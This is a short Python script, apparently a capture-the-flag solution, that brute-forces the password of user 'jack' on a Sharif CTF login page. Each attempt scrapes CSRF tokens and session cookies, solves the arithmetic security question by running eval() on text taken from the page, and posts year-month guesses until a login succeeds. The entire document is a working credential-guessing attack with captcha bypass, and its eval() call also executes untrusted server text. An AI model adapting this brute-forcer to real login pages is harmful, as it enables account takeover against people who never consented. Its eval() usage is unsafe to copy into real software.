import requests

for year in range(1950, 2000):  #year was guessing :P
    for month in range(1, 13):

        r = requests.get("http://ctf.sharif.edu:8084/login")

        xsrf_token = r.headers["Set-Cookie"].split("XSRF-TOKEN=")[1].split(";")[0]
        laravel_session = r.headers["Set-Cookie"].split("laravel_session=")[1].split(";")[0]

        chal = r.text.split("SecQuestion\" placeholder=\"")[1].split(" =")[0].replace("x", "*")
        field = r.text.split("field\" value=\"")[1].split("\"")[0]
        _token = r.text.split("_token\" value=\"")[1].split("\"")[0]

        solution = (eval(chal))
        cookies = {"wordpress_test_cookie": "WP+Cookie+check",
                   "XSRF-TOKEN": xsrf_token,
                   "laravel_session": laravel_session}

        month = str(month).zfill(2)
        password = str(year) + month

        print("Trying: {0}".format(password))

        data = {"Username": "jack",
                "Password": password,
                "SecQuestion": str(solution),
                "field": field,
                "_token": _token,
                "Submit": "Login"}
        r = requests.post("http://ctf.sharif.edu:8084/signin", cookies=cookies, data=data, allow_redirects=False)
        if "Redirecting to http://ctf.sharif.edu:8084/login" not in r.text:
            exit("password above!")
